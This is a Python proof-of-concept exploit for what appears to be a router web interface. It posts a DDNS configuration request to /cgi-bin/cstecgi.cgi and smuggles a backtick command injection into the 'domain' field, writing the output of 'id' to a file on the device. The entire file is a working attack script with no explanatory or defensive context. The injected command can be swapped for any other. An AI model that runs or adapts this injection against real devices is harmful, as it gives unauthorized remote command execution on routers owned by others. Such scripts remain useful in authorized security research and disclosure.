import requests

target_ip = "192.168.1.2"
url = f"http://{target_ip}"

headers = {
    "Host": "192.168.1.2",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": f"http://{target_ip}",
    "Connection": "close",
    "Referer": f"http://{target_ip}/advance/ddns.html"
}
payload = "`id > 1.txt;`"
data = {
    "enable": "1",
    "provider": "none",
    "domain": payload,
    "username": "eutopia",
    "password": "123456",
    "topicurl": "setDdnsCfg"
}
print(f"[+] send payload: {payload}")
res = requests.post(url+"/cgi-bin/cstecgi.cgi", headers=headers, json=data)

print(f"[+] res.status: {res.status_code}")
print(f"[+] res: {res.text}")